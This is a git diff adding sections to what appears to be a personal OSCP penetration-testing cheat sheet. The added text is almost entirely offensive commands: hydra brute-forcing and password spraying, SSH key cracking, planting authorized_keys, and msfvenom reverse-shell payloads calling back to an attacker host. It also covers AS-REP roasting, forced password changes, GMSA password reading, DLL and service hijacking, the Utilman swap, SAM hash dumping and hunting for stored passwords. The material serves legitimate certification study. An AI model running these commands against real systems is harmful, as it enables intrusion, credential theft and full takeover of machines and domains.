@@ -9,6 +9,241 @@ Kullaisec - Just for simplicity and fastness
 
 ## Commands 
 
+### FTP [21]
+
+```
+ftp <IP>
+#login if you have relevant creds or based on nmpa scan find out whether this has anonymous login or not, then loginwith Anonymous:password
+
+put <file> #uploading file
+get <file> #downloading file
+passive
+
+#NSE
+locate .nse | grep ftp
+nmap -p21 --script=<name> <IP>
+
+#bruteforce
+hydra -L users.txt -P passwords.txt <IP> ftp
+
+#'-L' for usernames list, '-l' for username and viceversa
+
+#check for vulnerabilities associated with the version identified.
+```
+
+### SSH [22]
+
+```
+#Login
+ssh uname@IP #enter password in the prompt
+
+#id_rsa or id_ecdsa file
+chmod 600 id_rsa/id_ecdsa
+ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for password, crack them using John
+
+#cracking id_rsa or id_ecdsa
+ssh2john id_ecdsa(or)id_rsa > hash
+john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
+
+#bruteforce
+hydra -l uname -P passwords.txt <IP> ssh
+
+#'-L' for usernames list, '-l' for username and viceversa
+
+# If You have found any Directory Transversal and you are able to upload any files then You can Upload the ssh public key and get the shell Easily
+
+ssh-keygen
+# this will generate id_rsa.pub and id_rsa private keys in our /root/.ssh folder
+Just copy these files to our pwd and rename the public key as `authorized_keys` and private key as norman id_rsa
+
+and Upload the authorized_keys at `/home/username/.ssh/` path folder After uploading chnage the permissions of private key in our kali
+
+ssh -i id_rsa username@IP
+
+You will get ssh access to the target system !!
+
+#check for vulnerabilities associated with the version identified.
+```
+
+### SMB
+
+```
+sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided
+
+#NSE scripts can be used
+locate .nse | grep smb
+nmap -p445 --script="name" $IP 
+
+#In windows we can view like this
+net view \\<computername/IP> /all
+
+#crackmapexec
+crackmapexec smb <IP/range>  
+crackmapexec smb 192.168.1.100 -u username -p password
+crackmapexec smb 192.168.1.100 -u username -p password --shares #lists available shares
+crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
+crackmapexec smb 192.168.1.100 -u username -p password --all #all information
+crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
+crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
+
+#Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.
+crackmapexec smb 192.168.225.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+
+# Smbclient
+smbclient -L //IP #or try with 4 /'s
+smbclient //server/share
+smbclient //server/share -U <username>
+smbclient //server/share -U domain/username
+
+#SMBmap
+smbmap -H <target_ip>
+smbmap -H <target_ip> -u <username> -p <password>
+smbmap -H <target_ip> -u <username> -p <password> -d <domain>
+smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
+
+#Within SMB session
+put <file> #to upload file
+get <file> #to download file
+
+mask ""
+recurse ON
+prompt OFF
+mget *
+
+enum4linux -a $IP
+```
+### LDAP
+
+```
+
+# nmap -sV --script "ldap* and not brute" $IP
+
+ldapsearch -x -H ldap://192.168.225.122 -D '' -w '' -b "DC=hutch,DC=offsec"
+
+or 
+
+ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.225.122" "(objectclass=*)"
+
+ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
+
+ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
+#CN name describes the info w're collecting
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
+
+#windapsearch.py
+#for computers
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers
+
+#for groups
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups
+
+#for users
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da
+
+#for privileged users
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
+```
+
+### NFS
+
+```
+nmap -sV --script=nfs-showmount <IP>
+showmount -e <IP>
+```
+If You found anythign Intresting Mount is accessiable for everyone mount that file locally and enumerate !!
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/fc15a70c-d34c-48ed-8299-fd9aebe819d8)
+
+Create a `mnt` folder locally in our kali
+
+```
+# mount -t nfs -o vers=2 $IP:/home /mnt 
+```
+
+### SNMP
+```
+#Nmap UDP scan
+sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt
+
+Must Try:
+
+→ Seen SNMP running so started with the snmp enumeration !!
+
+Before starting make sure you have these settings setup:
+
+
+sudo apt-get install snmp-mibs-downloader
+sudo download-mibs
+
+# Finally comment the line saying "mibs :" in /etc/snmp/snmp.conf
+sudo vi /etc/snmp/snmp.conf
+
+snmpbulkwalk -c public -v2c $IP
+
+snmpbulkwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+
+snmpbulkwalk -c public -v2c $IP .
+
+snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly
+
+snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
+snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports
+
+#Windows MIB values
+1.3.6.1.2.1.25.1.6.0 - System Processes
+1.3.6.1.2.1.25.4.2.1.2 - Running Programs
+1.3.6.1.2.1.25.4.2.1.4 - Processes Path
+1.3.6.1.2.1.25.2.3.1.4 - Storage Units
+1.3.6.1.2.1.25.6.3.1.2 - Software Name
+1.3.6.1.4.1.77.1.2.25 - User Accounts
+1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
+```
+
+### RPC Enum
+
+```
+rpcclient -U=user $IP
+rpcclient -U="" $IP #Anonymous login
+##Commands within in RPCclient
+srvinfo
+enumdomusers #users
+enumpriv #like "whoami /priv"
+queryuser <user> #detailed user info
+getuserdompwinfo <RID> #password policy, get user-RID from previous command
+lookupnames <user> #SID of specified user
+createdomuser <username> #Creating a user
+deletedomuser <username>
+enumdomains
+enumdomgroups
+querygroup <group-RID> #get rid from previous command
+querydispinfo #description of all users
+netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
+netshareenumall
+lsaenumsid #SID of all users
+```
+
+### MSFVENOM
+```
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+```
+
+
 ### AD
 .NET :
 
@@ -147,6 +382,18 @@ Linux:
 ```
 # impacket-GetNPUsers oscp.lab/username -outfile wsername.hash
 ```
+```
+ASRep with-out password !!
+
+# GetNPUsers.py -dc-ip <IP> -no-pass -userfile usernames.txt domain/
+
+#Asreproasting, need to provide usernames list
+
+# GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt
+
+./GetNPUsers.py -dc-ip IP -request 'htb.local/'
+```
+
 We need to add $23$ to the hash like:
 
 ![image](https://github.com/kullaisec/OSCP/assets/99985908/94a9550e-6d4a-4a96-80fb-9e1e4570cfd7)
@@ -273,6 +520,41 @@ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
+### Forced Password Change Using rpcclient
+
+```
+ForceChangePassword [Using RPC-client]
+ suppose we are `support` user and we have Privileges to chnage the password of `admin` user
+
+--> First authenticate via RPC using the support username and his credentials
+# rpccleint -U support IP 
+rpcclient $> setuserinfo2 admin 23 'Password@123'
+```
+
+### Read GMSA Password 
+
+![image](https://github.com/kullaisec/OSCP/assets/99985908/fe4a40fb-61c4-43f2-bdd6-87d811c6c349)
+
+```
+The Web Admins can see the GMSA password of svc_apache$ user !!
+
+We know that enox user is a member of Web Admins
+
+So we can get the svc_apache$ user hash !!
+
+Exploit Binary Path : https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe
+
+/home/kali/offsec/AD/tools/Tools/GMSAPasswordReader.exe
+
+Reference: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-gmsa/#gmsa-attributes-in-the-active-directory
+
+PS> .\gmsapasswordreader.exe --accountname svc_apache
+```
+![image](https://github.com/kullaisec/OSCP/assets/99985908/4160a3e7-6964-4dbd-afd8-3f63b8ee6041)
+
+You can see the hash `rc4hmac` you can pass the hash and get the interacted shell !!
+
+
 ### SMB to NTLM Theft
 
 Create a offsec.url as below
@@ -387,6 +669,20 @@ net use m: \\Kali_IP\test /user:kali kali
 ```
 ```
 copy mimikatz.log m:\
+```
+
+File sharing via command line !!
+```
+# kali : run smb !!! with username and password kali : kali
+
+# Windows:
+
+$pass = convertto-securestring 'kali' -AsPlaintext -Force
+$pass
+$cred = New-Object System.Management.Automation.PSCredential('kali', $pass)
+$cred 
+New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\IP\test
+cd kali:
 ```
 
 2) RDP mounting shared folder:
@@ -540,6 +836,20 @@ PS> .\SweetPotato.exe -a whoami
 PS> .\SweetPotato.exe -p shell.exe
 ```
 
+### SeRestorePrivilege
+
+Reference : https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges
+```
+Now we need to rename the C:\Windows\System32\Utilman.exe  binary to →  Utilman.old
+
+Now again rename the C:\Windows\System32\cmd.exe to →  Utilman.exe
+ 
+and Now open the RDP session and enter windows + U and you will get adminstrator shell !!
+
+# rdesktop DC01.heist.offsec
+```
+
+
 ## Windows Path Setting
 
 Sometims when you enter `whoami` command then it is not recognized by the Windows!!
@@ -672,6 +982,26 @@ C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" |
 
 Read OSCP Notes !!
 
+- Find Missing DLLs using Process Monitor, Identify a specific service which looks suspicious and add a filter.
+- Check whether you have write permissions in the directory associated with the service.
+
+```
+# Create a reverse-shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
+```
+- Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
+- Start listener and restart service, you'll get a shell.
+
+### Binary Hijacking
+
+```
+#Identify service from winpeas
+icalcs "path" #F means full permission, we need to check we have full access on folder
+sc qc <servicename> #find binarypath variable
+sc config <service> <option>="<value>" #change the path to the reverseshell location
+sc start <servicename>
+```
+
 ### Powershell History
 
 ```powershell
@@ -685,7 +1015,10 @@ Displayes the Powershell History files of `Dave` User
 **Command Prompt:**
 
 ```
-C:\> schtasks /query /fo LIST /v
+C:\> schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
+#Permission check - Writable means exploitable!
+icalcs "path"
+#Wait till the scheduled task in executed, then we'll get a shell
 ```
 
 **Powershell**
@@ -694,6 +1027,84 @@ C:\> schtasks /query /fo LIST /v
 PS > Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 If you see any binary you have full access or Modify permissions then replace it and wait for some time to get the elevated shell !!
+
+### InSecure GUI Apps:
+
+```
+#Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
+#Open that particular application, using "open" feature enter the following
+file://c:/windows/system32/cmd.exe 
+```
+### SAM and SYSTEM Files
+
+```
+# Usually %SYSTEMROOT% = C:\Windows
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+
+C:\windows.old
+
+#First go to c:
+dir /s SAM
+dir /s SYSTEM
+
+impacket-secretsdump -system SYSTEM -sam SAM local
+#always mention local in the command
+#Now a detailed list of hashes are displayed
+```
+
+### Runas Saved Creds
+```
+cmdkey /list #Displays stored credentials, looks for any optential users
+#Transfer the reverseshell
+runas /savecred /user:admin C:\Temp\reverse.exe
+```
+
+### Manul Files checking 
+
+```
+Search for them 
+
+findstr /si password *.txt 
+findstr /si password *.xml 
+findstr /si password *.ini 
+ 
+
+#Find all those strings in config files. 
+dir /s *pass* == *cred* == *vnc* == *.config* 
+ 
+
+# Find all passwords in all files. 
+findstr /spin "password" *.* 
+findstr /spin "password" *.* 
+ 
+
+In Files 
+
+These are common files to find them in. They might be base64-encoded. So look out for that. 
+
+c:\sysprep.inf 
+c:\sysprep\sysprep.xml 
+c:\unattend.xml 
+%WINDIR%\Panther\Unattend\Unattended.xml 
+%WINDIR%\Panther\Unattended.xml 
+ 
+
+dir c:\*vnc.ini /s /b 
+dir c:\*ultravnc.ini /s /b  
+dir c:\ /s /b | findstr /si *vnc.ini
+
+
+dir /s/b *.txt
+
+windows tree:
+
+tree /f /a
+```
 
 ### AlwaysInstallElevated
 
